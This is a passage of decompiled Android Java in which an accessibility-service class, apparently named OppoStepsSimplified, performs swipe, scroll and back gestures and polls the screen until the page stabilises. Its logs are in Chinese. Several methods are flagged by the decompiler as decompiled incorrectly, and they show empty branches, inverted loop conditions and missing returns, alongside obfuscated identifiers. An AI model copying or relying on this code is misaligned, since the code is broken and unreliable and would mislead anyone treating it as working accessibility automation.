        m212303e0("[滑动] 水平滑动: (" + f2 + ", " + f4 + ") -> (" + f3 + ", " + f4 + ")");
        Path path = new Path();
        path.moveTo(f2, f4);
        path.lineTo(f3, f4);
        this.f55111a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 400L)).build(), null, null);
    }

    /* renamed from: f2 */
    public final Object m212347f2(ContinuationImpl continuationImpl) {
        this.f55111a0.performGlobalAction(2);
        Object objM210571b1 = b81.m210571b1(500L, continuationImpl);
        return objM210571b1 == CoroutineSingletons.f57606a0 ? objM210571b1 : C1351vv.f60710b1;
    }

    /* renamed from: f3 */
    public final boolean m212348f3() {
        int i = Build.VERSION.SDK_INT;
        try {
            float f = r4.widthPixels / 2.0f;
            float f2 = this.f55112a1.getResources().getDisplayMetrics().heightPixels;
            float f3 = 0.65f * f2;
            float f4 = f2 * 0.4f;
            m212303e0("[滚动] 执行手势滚动: (" + f + ", " + f3 + ") → (" + f + ", " + f4 + "), SDK=" + i);
            Path path = new Path();
            path.moveTo(f, f3);
            path.lineTo(f, f4);
            boolean zDispatchGesture = this.f55111a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 300L)).build(), new C0429du(this), null);
            StringBuilder sb = new StringBuilder("[滚动] dispatchGesture返回: ");
            sb.append(zDispatchGesture);
            m212303e0(sb.toString());
            return zDispatchGesture;
        } catch (Exception e) {
            m212303e0("[滚动] ❌ 手势滚动异常: " + e.getMessage());
            return false;
        }
    }

    /* renamed from: f4 */
    public final boolean m212349f4() throws InterruptedException {
        AccessibilityNodeInfo accessibilityNodeInfoM212299d3;
        if (Build.VERSION.SDK_INT < 36) {
            AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
            if (accessibilityNodeInfoM212335d8 != null && (accessibilityNodeInfoM212299d3 = m212299d3(accessibilityNodeInfoM212335d8)) != null) {
                m212303e0("[滚动] 尝试ACTION_SCROLL_FORWARD...");
                if (accessibilityNodeInfoM212299d3.performAction(Buffer.SEGMENTING_THRESHOLD)) {
                    m212303e0("[滚动] ACTION_SCROLL_FORWARD返回true");
                    return true;
                }
                m212303e0("[滚动] ACTION_SCROLL_FORWARD返回false，尝试手势滚动");
            }
            return m212348f3();
        }
        m212303e0("[滚动] Android 16+，直接使用手势滚动");
        boolean zM212348f3 = m212348f3();
        if (zM212348f3) {
            try {
                Thread.sleep(300L);
                int iM212296b1 = m212296b1(m212335d8());
                int i = 0;
                for (int i2 = 0; i2 < 5; i2++) {
                    Thread.sleep(100L);
                    int iM212296b12 = m212296b1(m212335d8());
                    if (iM212296b12 == iM212296b1) {
                        i++;
                        if (i >= 2) {
                            m212303e0("[滚动稳定] ✅ 页面已稳定 (节点:" + iM212296b12 + ")");
                        }
                    } else {
                        i = 0;
                        iM212296b1 = iM212296b12;
                    }
                }
            } catch (Exception e) {
                m212303e0("[滚动稳定] ⚠️ 等待异常: " + e.getMessage());
            }
        }
        return zM212348f3;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: f5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212350f5(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$scrollDownWithStability$1 oppoStepsSimplified$scrollDownWithStability$1;
        boolean zM212349f4;
        boolean z;
        if (continuationImpl instanceof OppoStepsSimplified$scrollDownWithStability$1) {
            oppoStepsSimplified$scrollDownWithStability$1 = (OppoStepsSimplified$scrollDownWithStability$1) continuationImpl;
            int i = oppoStepsSimplified$scrollDownWithStability$1.f54637a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$scrollDownWithStability$1.f54637a3 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$scrollDownWithStability$1 = new OppoStepsSimplified$scrollDownWithStability$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$scrollDownWithStability$1.f54635a1;
        Object obj2 = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$scrollDownWithStability$1.f54637a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            int iM212296b1 = m212296b1(m212335d8());
            zM212349f4 = m212349f4();
            if (zM212349f4) {
                oppoStepsSimplified$scrollDownWithStability$1.f54634a0 = zM212349f4;
                oppoStepsSimplified$scrollDownWithStability$1.f54637a3 = 1;
                if (m212353f8(iM212296b1, 1500L, oppoStepsSimplified$scrollDownWithStability$1) == obj2) {
                    return obj2;
                }
                z = zM212349f4;
            }
            return Boolean.valueOf(zM212349f4);
        }
        if (i2 != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        z = oppoStepsSimplified$scrollDownWithStability$1.f54634a0;
        kg1.m213544f4(obj);
        zM212349f4 = z;
        return Boolean.valueOf(zM212349f4);
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: f6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212351f6(int i, long j, long j2, ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$waitForPageStable$1 oppoStepsSimplified$waitForPageStable$1;
        C0368a5 c0368a5;
        long j3;
        OppoStepsSimplified$waitForPageStable$1 oppoStepsSimplified$waitForPageStable$12;
        C0368a5 c0368a52;
        long jCurrentTimeMillis;
        int i2;
        int i3;
        long j4;
        int i4;
        int i5;
        if (continuationImpl instanceof OppoStepsSimplified$waitForPageStable$1) {
            oppoStepsSimplified$waitForPageStable$1 = (OppoStepsSimplified$waitForPageStable$1) continuationImpl;
            int i6 = oppoStepsSimplified$waitForPageStable$1.f54649b0;
            if ((i6 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$waitForPageStable$1.f54649b0 = i6 - Integer.MIN_VALUE;
                c0368a5 = this;
            } else {
                c0368a5 = this;
                oppoStepsSimplified$waitForPageStable$1 = new OppoStepsSimplified$waitForPageStable$1(c0368a5, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$waitForPageStable$1.f54647a8;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i7 = oppoStepsSimplified$waitForPageStable$1.f54649b0;
        if (i7 == 0) {
            kg1.m213544f4(obj);
            j3 = j2;
            oppoStepsSimplified$waitForPageStable$12 = oppoStepsSimplified$waitForPageStable$1;
            c0368a52 = c0368a5;
            jCurrentTimeMillis = System.currentTimeMillis();
            i2 = 0;
            i3 = 0;
            j4 = j;
            i4 = -1;
            i5 = i;
        } else {
            if (i7 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i8 = oppoStepsSimplified$waitForPageStable$1.f54643a4;
            int i9 = oppoStepsSimplified$waitForPageStable$1.f54642a3;
            int i10 = oppoStepsSimplified$waitForPageStable$1.f54641a2;
            long j5 = oppoStepsSimplified$waitForPageStable$1.f54646a7;
            long j6 = oppoStepsSimplified$waitForPageStable$1.f54645a6;
            long j7 = oppoStepsSimplified$waitForPageStable$1.f54644a5;
            int i11 = oppoStepsSimplified$waitForPageStable$1.f54640a1;
            C0368a5 c0368a53 = oppoStepsSimplified$waitForPageStable$1.f54639a0;
            kg1.m213544f4(obj);
            i5 = i11;
            oppoStepsSimplified$waitForPageStable$12 = oppoStepsSimplified$waitForPageStable$1;
            c0368a52 = c0368a53;
            i4 = i10;
            i2 = i8;
            i3 = i9;
            j3 = j6;
            j4 = j7;
            jCurrentTimeMillis = j5;
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j3) {
            i2++;
            AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = c0368a52.m212335d8();
            int iM212296b1 = accessibilityNodeInfoM212335d8 != null ? m212296b1(accessibilityNodeInfoM212335d8) : 0;
            if (iM212296b1 != i4 || iM212296b1 <= 0) {
                i3 = 0;
            } else {
                i3++;
                if (i3 >= i5) {
                    StringBuilder sbM38b9 = AbstractC0003a2.m38b9("[页面稳定] ✅ 稳定 (节点:", iM212296b1, ", 连续", i3, "次, 检查");
                    sbM38b9.append(i2);
                    sbM38b9.append("次)");
                    m212303e0(sbM38b9.toString());
                    return Boolean.TRUE;
                }
                iM212296b1 = i4;
            }
            oppoStepsSimplified$waitForPageStable$12.f54639a0 = c0368a52;
            oppoStepsSimplified$waitForPageStable$12.f54640a1 = i5;
            oppoStepsSimplified$waitForPageStable$12.f54644a5 = j4;
            oppoStepsSimplified$waitForPageStable$12.f54645a6 = j3;
            oppoStepsSimplified$waitForPageStable$12.f54646a7 = jCurrentTimeMillis;
            oppoStepsSimplified$waitForPageStable$12.f54641a2 = iM212296b1;
            oppoStepsSimplified$waitForPageStable$12.f54642a3 = i3;
            oppoStepsSimplified$waitForPageStable$12.f54643a4 = i2;
            oppoStepsSimplified$waitForPageStable$12.f54649b0 = 1;
            if (b81.m210571b1(j4, oppoStepsSimplified$waitForPageStable$12) == coroutineSingletons) {
                return coroutineSingletons;
            }
            i4 = iM212296b1;
        }
        c0368a52.getClass();
        m212303e0("[页面稳定] ⚠️ 超时 (" + j3 + "ms, 检查" + i2 + "次, 节点:" + i4 + ")");
        return Boolean.FALSE;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: f7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212352f7(int i, long j, ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$waitForRootViewCount$1 oppoStepsSimplified$waitForRootViewCount$1;
        int i2;
        long jCurrentTimeMillis;
        long j2;
        C0368a5 c0368a5;
        if (continuationImpl instanceof OppoStepsSimplified$waitForRootViewCount$1) {
            oppoStepsSimplified$waitForRootViewCount$1 = (OppoStepsSimplified$waitForRootViewCount$1) continuationImpl;
            int i3 = oppoStepsSimplified$waitForRootViewCount$1.f54656a6;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$waitForRootViewCount$1.f54656a6 = i3 - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$waitForRootViewCount$1 = new OppoStepsSimplified$waitForRootViewCount$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$waitForRootViewCount$1.f54654a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = oppoStepsSimplified$waitForRootViewCount$1.f54656a6;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            i2 = i;
            jCurrentTimeMillis = System.currentTimeMillis();
            j2 = j;
            c0368a5 = this;
        } else {
            if (i4 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            jCurrentTimeMillis = oppoStepsSimplified$waitForRootViewCount$1.f54653a3;
            j2 = oppoStepsSimplified$waitForRootViewCount$1.f54652a2;
            i2 = oppoStepsSimplified$waitForRootViewCount$1.f54651a1;
            c0368a5 = oppoStepsSimplified$waitForRootViewCount$1.f54650a0;
            kg1.m213544f4(obj);
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
            AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = c0368a5.m212335d8();
            if (accessibilityNodeInfoM212335d8 != null && accessibilityNodeInfoM212335d8.getChildCount() >= i2) {
                return Boolean.TRUE;
            }
            oppoStepsSimplified$waitForRootViewCount$1.f54650a0 = c0368a5;
            oppoStepsSimplified$waitForRootViewCount$1.f54651a1 = i2;
            oppoStepsSimplified$waitForRootViewCount$1.f54652a2 = j2;
            oppoStepsSimplified$waitForRootViewCount$1.f54653a3 = jCurrentTimeMillis;
            oppoStepsSimplified$waitForRootViewCount$1.f54656a6 = 1;
            if (b81.m210571b1(150L, oppoStepsSimplified$waitForRootViewCount$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
        }
        return Boolean.TRUE;
    }

    /* JADX WARN: Removed duplicated region for block: B:17:0x006a  */
    /* JADX WARN: Removed duplicated region for block: B:32:0x00ce  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:29:0x00c9 -> B:31:0x00cc). Please report as a decompilation issue!!! */
    /* renamed from: f8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212353f8(int i, long j, ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$waitForScrollComplete$1 oppoStepsSimplified$waitForScrollComplete$1;
        C0368a5 c0368a5;
        int i2;
        OppoStepsSimplified$waitForScrollComplete$1 oppoStepsSimplified$waitForScrollComplete$12;
        C0368a5 c0368a52;
        long jCurrentTimeMillis;
        int i3;
        int i4;
        int i5;
        long j2;
        if (continuationImpl instanceof OppoStepsSimplified$waitForScrollComplete$1) {
            oppoStepsSimplified$waitForScrollComplete$1 = (OppoStepsSimplified$waitForScrollComplete$1) continuationImpl;
            int i6 = oppoStepsSimplified$waitForScrollComplete$1.f54666a9;
            if ((i6 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$waitForScrollComplete$1.f54666a9 = i6 - Integer.MIN_VALUE;
                c0368a5 = this;
            } else {
                c0368a5 = this;
                oppoStepsSimplified$waitForScrollComplete$1 = new OppoStepsSimplified$waitForScrollComplete$1(c0368a5, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$waitForScrollComplete$1.f54664a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i7 = oppoStepsSimplified$waitForScrollComplete$1.f54666a9;
        int i8 = 1;
        if (i7 == 0) {
            kg1.m213544f4(obj);
            i2 = i;
            oppoStepsSimplified$waitForScrollComplete$12 = oppoStepsSimplified$waitForScrollComplete$1;
            c0368a52 = c0368a5;
            jCurrentTimeMillis = System.currentTimeMillis();
            i3 = 0;
            i4 = 0;
            i5 = i2;
            j2 = j;
            if (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
            }
        } else {
            if (i7 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i9 = oppoStepsSimplified$waitForScrollComplete$1.f54661a4;
            int i10 = oppoStepsSimplified$waitForScrollComplete$1.f54660a3;
            int i11 = oppoStepsSimplified$waitForScrollComplete$1.f54659a2;
            jCurrentTimeMillis = oppoStepsSimplified$waitForScrollComplete$1.f54663a6;
            long j3 = oppoStepsSimplified$waitForScrollComplete$1.f54662a5;
            int i12 = oppoStepsSimplified$waitForScrollComplete$1.f54658a1;
            c0368a52 = oppoStepsSimplified$waitForScrollComplete$1.f54657a0;
            kg1.m213544f4(obj);
            i2 = i12;
            oppoStepsSimplified$waitForScrollComplete$12 = oppoStepsSimplified$waitForScrollComplete$1;
            i5 = i11;
            i3 = i9;
            i4 = i10;
            j2 = j3;
            i8 = 1;
            if (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
                int iM212296b1 = m212296b1(c0368a52.m212335d8());
                if (i3 == 0 && iM212296b1 != i2) {
                    m212303e0("[滚动等待] 内容已变化: " + i2 + " → " + iM212296b1);
                    i3 = i8;
                }
                if (iM212296b1 != i5) {
                    i5 = iM212296b1;
                    i4 = 0;
                } else {
                    i4 += i8;
                    if (i4 >= 2 && i3 != 0) {
                        m212303e0("[滚动等待] ✅ 滚动完成并稳定 (节点:" + iM212296b1 + ")");
                        return Boolean.TRUE;
                    }
                }
                oppoStepsSimplified$waitForScrollComplete$12.f54657a0 = c0368a52;
                oppoStepsSimplified$waitForScrollComplete$12.f54658a1 = i2;
                oppoStepsSimplified$waitForScrollComplete$12.f54662a5 = j2;
                oppoStepsSimplified$waitForScrollComplete$12.f54663a6 = jCurrentTimeMillis;
                oppoStepsSimplified$waitForScrollComplete$12.f54659a2 = i5;
                oppoStepsSimplified$waitForScrollComplete$12.f54660a3 = i4;
                oppoStepsSimplified$waitForScrollComplete$12.f54661a4 = i3;
                oppoStepsSimplified$waitForScrollComplete$12.f54666a9 = i8;
                if (b81.m210571b1(100L, oppoStepsSimplified$waitForScrollComplete$12) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                i8 = 1;
                if (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
                    c0368a52.getClass();
                    m212303e0("[滚动等待] ⚠️ 超时 (" + j2 + "ms)");
                    return Boolean.valueOf(i3 != 0);
                }
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:17:0x003c  */
    /* JADX WARN: Removed duplicated region for block: B:22:0x0055  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:20:0x004f -> B:21:0x0052). Please report as a decompilation issue!!! */
    /* renamed from: f9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212354f9(long j, ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$z$1 oppoStepsSimplified$z$1;
        if (continuationImpl instanceof OppoStepsSimplified$z$1) {
            oppoStepsSimplified$z$1 = (OppoStepsSimplified$z$1) continuationImpl;
            int i = oppoStepsSimplified$z$1.f54671a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$z$1.f54671a4 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$z$1 = new OppoStepsSimplified$z$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$z$1.f54669a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$z$1.f54671a4;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            if (j > 0) {
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            long j2 = oppoStepsSimplified$z$1.f54668a1;
            long j3 = oppoStepsSimplified$z$1.f54667a0;
            kg1.m213544f4(obj);
            j = j3 - j2;
            if (j > 0) {
                long jMin = Math.min(j, 100L);
                oppoStepsSimplified$z$1.f54667a0 = j;
                oppoStepsSimplified$z$1.f54668a1 = jMin;
                oppoStepsSimplified$z$1.f54671a4 = 1;
                if (b81.m210571b1(jMin, oppoStepsSimplified$z$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                j3 = j;
                j2 = jMin;
                j = j3 - j2;
                if (j > 0) {
                    return C1351vv.f60710b1;
                }
            }
        }
    }
}
